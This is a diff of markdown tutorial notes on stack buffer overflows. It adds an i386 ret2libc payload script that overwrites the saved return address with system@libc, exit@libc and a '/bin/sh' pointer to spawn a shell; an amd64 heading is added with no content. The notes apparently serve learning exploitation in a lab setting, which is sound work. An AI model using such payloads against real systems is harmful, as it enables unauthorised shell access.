@@ -1,5 +1,5 @@
   
-## Rewriting the saved eip
+## 1- Rewriting the saved eip
 
 for i386, we have : 
 
@@ -167,3 +167,29 @@ int main(void) {
   return 0;
 }
 ```
+
+## 2- stack buffer overflow exploitation
+### for i386, we have : 
+here is the payload injected into the buffer 
+```python
+#!/usr/bin/python
+import sys
+# Padding with 'A's
+buffer = b'A' * 76
+# Set saved eip to system@libc
+buffer += b'\x50\xa1\xd9\xf7'
+
+# Set to exit@libc
+buffer += b'\xc0\x50\xd8\xf7'
+
+
+# Set argument to "/bin/sh"@libc
+buffer += b'\x52\x3e\xf1\xf7'
+
+# Set exit argument
+buffer += b'\x00\x00\x00\x00'
+# Printing out the buffer
+sys.stdout.buffer.write(buffer)
+```
+
+### For amd64, we have : 
